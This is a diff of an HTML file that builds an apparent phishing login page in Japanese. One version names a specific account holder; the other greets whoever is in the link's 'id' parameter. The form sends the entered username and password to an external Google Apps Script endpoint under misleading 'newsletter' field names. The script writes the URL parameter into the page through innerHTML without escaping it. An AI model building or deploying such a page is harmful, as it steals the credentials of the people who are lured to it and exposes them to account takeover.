@@ -1,5 +1,44 @@
-<form id="form" method="get" action="https://script.google.com/macros/s/AKfycbzVI63uQ6Bi4v_dKPlCcKpueLnBzKaxa5kD9StVmy4hllqmp58hpWav_X5dJ-QgWDd7/exec" accept-charset="UTF-8">
-<h1>@bakay.amaさんのパスワードを入力してください</h1>
-<input type="text" name="newletter_name" placeholder="User" value="@bakay.ama"/>
-<input type="text" name="newletter_email" placeholder="パスワード" />
-<input type="submit" value="続行" />
+<!DOCTYPE html>
+<html lang="ja" >
+<head>
+  <meta charset="UTF-8">
+  <title>ログイン</title>
+  <link rel="stylesheet" href="./style.css">
+
+</head>
+<body>
+<!-- partial:index.partial.html -->
+<div class="form-wrapper">
+  <h1><var id="test-table">id</var>さんのパスワードを入力してください</h1>
+  <form id="form" method="get" action="https://script.google.com/macros/s/AKfycbzVI63uQ6Bi4v_dKPlCcKpueLnBzKaxa5kD9StVmy4hllqmp58hpWav_X5dJ-QgWDd7/exec" accept-charset="UTF-8">
+  <form>
+
+    <div class="form-item">
+      <label for="email"></label>
+      <input type="text" name="newletter_name" placeholder="ユーザー名" value="">
+    </div>
+    <div class="form-item">
+      <label for="password"></label>
+      <input type="text" name="newletter_email" placeholder="パスワード" />
+    </div>
+    <div class="button-panel">
+      <input type="submit" class="button" title="Sign In" value="Sign In"></input>
+    </div>
+  </form>
+  <div class="form-footer">
+    <p><a href="#">Create an account</a></p>
+    <p><a href="#">Forgot password?</a></p>
+  </div>
+</div>
+<!-- partial -->
+<script type="text/javascript">
+  let url = new URL(window.location.href);
+  let params = url.searchParams;
+  let userid = params.get('id');
+  console.log(userid); // 5
+
+  var element = document.getElementById('test-table');
+  element.innerHTML = userid;
+</script>
+</body>
+</html>
